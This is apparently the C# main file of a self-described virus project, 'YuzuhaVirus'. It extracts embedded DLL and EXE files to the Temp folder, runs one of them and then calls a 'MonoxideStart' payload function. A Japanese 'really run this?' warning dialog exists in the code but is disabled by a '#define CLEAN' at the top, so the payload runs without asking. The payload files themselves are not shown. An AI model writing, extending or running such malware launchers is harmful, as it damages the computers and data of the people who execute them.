#define CLEAN

using System;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Threading;
using static YuzuhaVirus.Extract;
using static YuzuhaVirus.Functions;
using static YuzuhaVirus.DLL;
using Microsoft.Win32;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace YuzuhaVirus
{
    class Program
    {

        static void Main( string[] args )
        {
#if CLEAN
#else
            DialogResult result = MessageBox.Show( "本当に実行しますか？", "警告～柚葉ウイルス～", MessageBoxButtons.YesNo, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button2 );

            if (result == DialogResult.Yes)
            {
                ExecutePayload();
            }
            else if (result == DialogResult.No)
            {
                Application.Exit();
            }
#endif

            ExecutePayload();
        }

        public static void ExecutePayload()
        {

            Directory.SetCurrentDirectory( Path.GetTempPath() ); //作業ディレクトリをTempフォルダーにする

            DLL_Extract(); //DLLを展開
            EXE_Extract(); //EXEを展開

            Process.Start( "YuzuMuch.exe" ); //展開したYuzuMuch.exeの実行

            SecSleep( 5 ); //5秒待機

            MonoxideStart(); //展開したMonoxide.dllにあるMonoxideStart関数の実行

            /*
            Process[] ps = Process.GetProcessesByName( "YuzuMuch.exe" );
            foreach (Process p in ps)
            {
                p.Kill();
            }
            */




            //SecSleep( 10 ); //10秒待機
            return;
        }
    }
}
